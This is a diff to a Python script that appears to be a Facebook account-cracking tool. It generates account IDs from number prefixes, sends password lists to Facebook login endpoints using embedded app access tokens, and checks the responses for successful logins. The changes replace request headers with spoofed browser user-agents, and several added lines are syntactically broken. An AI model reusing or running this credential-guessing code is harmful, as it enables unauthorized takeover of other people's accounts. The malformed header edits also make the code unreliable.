@@ -289,7 +289,7 @@ def menu():
 def pak():
 		user=[]
 		clear()
-		print('\033[1;35m Code example: 0306,0315,0335,0345')
+		print('\033[1;35m Code example: 300,315,335,345')
 		code = input('\033[1;37m put code: ')
 		try:
 			limit = int(input('\033[1;35m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
@@ -486,8 +486,8 @@ def api1(ids,names,passlist):
 				'fb_api_req_friendly_name':'authenticate',
 				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
 				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-				head = {
-				'content-type':'application/x-www-form-urlencoded',
+				head = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5666.221 Safari/537.36',
+               'viewport-width': '980',
 				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
 				'x-fb-connection-type':'unknown',
 				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
@@ -667,7 +667,8 @@ def api3(ids,names,passlist):
 "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
 "X-FB-Friendly-Name": "authenticate",
 "X-FB-Connection-Type": "unknown",
-"Content-Type": "application/x-www-form-urlencoded",
+"'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5666.221 Safari/537.36'. 
+  'viewport-width': '980',    ",
 "X-FB-HTTP-Engine": "Liger",
 "Content-Length": "329",}
                         url = 'https://b-graph.facebook.com/auth/login'
@@ -768,9 +769,8 @@ def api4(ids,names,passlist):
                                 'X-FB-Connection-Type':'unknown',
                                 'User-Agent':ua,
                                 'Accept-Encoding':'gzip, deflate',
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                'X-FB-HTTP-Engine': 'Liger'
-                                }
+                               'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5666.221 Safari/537.36',
+                               'viewport-width': '980',         }
                         url = 'https://b-api.facebook.com/method/auth.login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
@@ -872,8 +872,8 @@ def api5(ids,names,passlist):
 "api_key": "882a8490361da98702bf97a021ddc14d",}
                         headers={
                                 'User-Agent': ua,
-'Content-Type': 'application/x-www-form-urlencoded',
-'Host': 'graph.facebook.com',
+'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5666.221 Safari/537.36',
+ 'viewport-width': '980',
 'X-FB-Net-HNI': '25227',
 'X-FB-SIM-HNI': '29752',
 'X-FB-Connection-Type': 'MOBILE.LTE',
@@ -1290,8 +1290,7 @@ def SK3(ids,passlist):
                                 'X-FB-Connection-Type':'unknown',
                                 'User-Agent':ua,
                                 'Accept-Encoding':'gzip, deflate',
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                'X-FB-HTTP-Engine': 'Liger'
+                             'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5666.221 Safari/537.36'     'viewport-width': '980',
                                 }
                         url = 'https://b-graph.facebook.com/auth/login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
@@ -1533,25 +1532,25 @@ def SK6(ids,passlist):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			headers = {'authority': 'x.facebook.com',
-    'method': 'path',
-	'scheme': 'https',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-ch-ua-platform-version': '""',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
-    'viewport-width': '980',
+			headers = { 'authority': 'mbasic.facebook.com',
+            'method': 'path',
+	       'scheme': 'https',
+           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+           'accept-language': 'en-US,en;q=0.9',
+           'cache-control': 'max-age=0',
+           'sec-ch-prefers-color-scheme': 'light',
+           'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
+           'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5666.221", "Google Chrome";v="114.0.5666.221"',
+           'sec-ch-ua-mobile': '?0',
+           'sec-ch-ua-platform': '"macOS"',
+           'sec-ch-ua-platform-version': '""',
+           'sec-fetch-dest': 'document',
+           'sec-fetch-mode': 'navigate',
+           'sec-fetch-site': 'none',
+           'sec-fetch-user': '?1',
+          'upgrade-insecure-requests': '1',
+          'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5666.221 Safari/537.36',
+          'viewport-width': '980',
 }
 			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
